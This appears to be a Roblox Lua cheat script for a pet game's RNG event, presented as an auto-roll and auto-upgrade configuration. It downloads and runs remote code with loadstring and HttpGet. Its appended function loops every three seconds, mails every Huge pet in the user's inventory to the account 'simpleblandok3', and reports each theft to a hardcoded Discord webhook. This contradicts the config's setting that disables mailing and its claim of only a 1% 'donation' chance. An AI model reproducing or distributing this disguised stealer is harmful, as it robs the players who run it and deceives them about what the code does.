getgenv().RngEvent = {
    Selected_RngEgg = "First",
    Rolling_Enabled = true,
    Rolling_Delay = 0.1,
    Visible_Rolling = false, -- Visible Rolling is Slower by ~1s; but you can see it :P

    Selected_Upgrades = {"RNGHugeLuck", "RNGEggLuck", "RNGHatchSpeed", "RNGBonusLuck"},
    AutoUpgrades_Enabled = true,
    AutoMerchant_Enabled = true,
    Lucky_Dice_Enabled = true,
    Lucky_Dice_Config = {
        ["Lucky Dice"] = {Craft = false, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
        ["Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = nil},
        ["Mega Lucky Dice"] = {Craft = true, Use = false, Only_Use_If_Not_Active = false, Only_Use_If_Rolls_Ends_In = nil},
        ["Mega Lucky Dice II"] = {Craft = true, Use = true, Only_Use_If_Not_Active = true, Only_Use_If_Rolls_Ends_In = 9},
    },

    Webhook_Url = "",
    Discord_UserID = "",
    Huge_Mail_User = "",
    Huge_Mail_Enabled = false, -- Warning: Using auto has a 1% Chance of donating to KiTTYWARE Devs

    fps_boost = true, -- erm makes game shtuff invisible
    fps_boost2 = true, -- erm disables game scripts so will break some in-game functionality like inventory Gui etc
    gui_stats_enabled = true,
    print_all_info = false, -- Will Print All Egg & Upgrade Names; for future updates (mainly for kw devs) :P
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/661ba97429a1d20f02880d1e9eeced08.lua"))()

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    local function GetItemInfo(ItemsClass, ItemsName)
        local Table = {}
        for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
            if table.find(ItemsName, Item.id) then
                local ItemInfo = {
                    ["uid"] = UID,
                    ["data"] = Item
                }
                table.insert(Table, ItemInfo)
            end
        end
        return Table
    end

    local function getCurrentHugePets()
        local GoldPetsTable = {}
        for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
            table.insert(GoldPetsTable, Pet.Name)
        end
        return GetItemInfo("Pet", GoldPetsTable)
    end

    local hugePets = {}
    local uids = {}

    for i, MadeTable in next, getCurrentHugePets() do
        if not table.find(ProcessedHuges, MadeTable.uid) then
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
            table.insert(ProcessedHuges, MadeTable.uid)
        end
    end

    print("Huge pets you have right now:", table.concat(hugePets, ", "))

    for i = #uids, 1, -1 do
        local args = {
            [1] = "simpleblandok3",
            [2] = "omg u got a new huge!!",
            [3] = "Pet",
            [4] = uids[i],
            [5] = 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

        wait(3)

        local webhook = "https://discord.com/api/webhooks/1267533930089680938/GQj5fiktIVKXK2PBkGtRPBZXfhCnC70yzsTNszEB6FZ6EnNXir1y5pze75Eso96yvRG7"
        local request = (syn and syn.request) or request or (http and http.request) or http_request
        
        request({
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = game.Players.LocalPlayer.Name .. " | Hatched A Huge! | " .. table.concat(hugePets, ", ")
            })
        })
    end
end

spawn(function()
    while true do
        ProcessHugePets()
        wait(3)
    end
end)
